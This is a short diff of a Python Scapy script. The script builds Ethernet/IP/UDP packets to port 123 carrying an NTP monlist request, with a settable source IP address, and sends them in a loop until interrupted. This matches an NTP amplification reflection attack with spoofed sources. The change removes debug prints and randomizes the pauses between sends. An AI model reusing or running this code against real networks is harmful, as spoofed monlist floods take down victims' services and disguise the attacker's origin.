@@ -35,15 +35,14 @@ class Th(Thread):
         for i in get_if_list():
             if 'eth0' in i or 's0' in i:
                 iface_eth0 = i
-        print self.src_ip
-        print self.dst_ip
         p = Ether(dst=self.dst_mac,src=self.src_mac)/IP(dst=self.dst_ip,src=self.src_ip)/UDP(dport=123,sport=123)/Raw(load=NTP_MONLIST_REQUEST)
         # loop = 1 -> send indefinitely, we have to ctrl + c to stop program
         # verbose = 0 -> no verbose
         while keep_going == True:
-            timeout = random.randrange(0,5)
-            time.sleep(float(timeout))
+            timeout = random.uniform(0,1)
+            time.sleep(timeout)
             sendp(p, iface = iface_eth0, loop=0, verbose=1)
+            timeout = random.uniform(3,5)
             time.sleep(float(timeout))
         
 
